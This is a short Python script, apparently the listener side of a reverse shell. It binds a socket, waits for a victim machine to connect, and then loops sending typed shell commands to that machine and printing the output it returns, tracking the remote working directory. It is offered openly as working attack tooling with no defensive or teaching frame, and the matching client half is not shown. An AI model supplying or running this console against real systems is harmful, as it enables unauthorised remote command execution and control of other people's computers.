import socket

SERVER_HOST = "127.0.0.1" #your ip
SERVER_PORT =  8080 #your port
BUFFER_SIZE = 1024 * 128 # msg size
# separator for sending 2 msg
SEPARATOR = "<sep>"
# socket
s = socket.socket()
# binding ip (all ip on this host
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
# connection accepting
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
# current using folder(directory) connecting
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)
while True:
    # for getting cammand
    command = input(f"{cwd} $> ")
    if not command.strip():
        # nothing
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # exit = break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
